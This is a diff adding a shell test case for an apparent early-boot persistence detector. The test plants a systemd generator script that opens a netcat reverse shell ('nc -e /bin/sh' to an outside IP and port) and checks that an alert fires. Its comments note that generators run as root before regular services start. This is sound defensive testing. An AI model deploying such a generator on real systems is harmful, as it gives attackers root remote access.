@@ -253,3 +253,19 @@ seed_benign() {
     DIRS_V="${GEND} ${GEND_USER}" run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in systemd generator: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to the brain-wide nc reverse-shell variant INVARIANT
+    # family already locked. systemd generators run AS ROOT in the
+    # initramfs / very early boot — BEFORE the regular service
+    # manager is up. Sister-vector to initramfs-hooks + grub-config
+    # + boot-script + kernel-install-hooks on the early-boot
+    # persistence brain.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${GEND}/my-generator"
+    chmod 0755 "${GEND}/my-generator"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
